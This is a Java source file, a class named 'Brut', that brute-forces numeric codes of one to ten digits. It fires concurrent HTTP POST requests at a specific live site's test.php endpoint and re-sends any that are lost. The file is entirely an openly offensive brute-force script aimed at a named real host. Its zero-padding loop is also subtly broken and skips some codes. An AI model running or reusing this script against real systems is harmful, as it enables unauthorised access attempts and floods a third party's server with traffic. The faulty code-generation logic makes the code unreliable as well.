package com.salenko.run;

import java.io.IOException;
import java.util.ArrayList;
import java.util.concurrent.CountDownLatch;

import org.apache.http.impl.nio.client.CloseableHttpAsyncClient;
import org.apache.http.impl.nio.client.HttpAsyncClients;
import com.salenko.run.HttpRequest;

public class Brut {

    // generates code value
    public static String generateCode(Integer value, int length) {
        String code = value.toString();
        final Integer g = value;
        for (int k = 0; k < length - code.length(); k++) {
            code = "0" + code;
        }
        return code;
    }

    public static void main(String[] args) throws InterruptedException, IOException {
        String requestURL = "http://www.rollshop.co.il/test.php";

        CloseableHttpAsyncClient httpclient = HttpAsyncClients.custom().setMaxConnTotal(40).setMaxConnPerRoute(40)
                .build();
        try {
            httpclient.start();
            int limit = 1;
            for (int i = 1; i <= 10; i++) {
                // reSends - collect lost messages
                ArrayList<String> reSends = new ArrayList();
                limit *= 10;
                final CountDownLatch latch1 = new CountDownLatch(1);
                // sending messages
                for (Integer j = 0; j < limit; j++) {
                    HttpRequest.doPost(generateCode(j, i), requestURL, httpclient, latch1, reSends);
                }
                // re-sending lost messages
                for (String code : reSends) {
                    HttpRequest.doPost(code, requestURL, httpclient, latch1, reSends);
                }
            }

        } finally {
            httpclient.close();
        }
    }
}
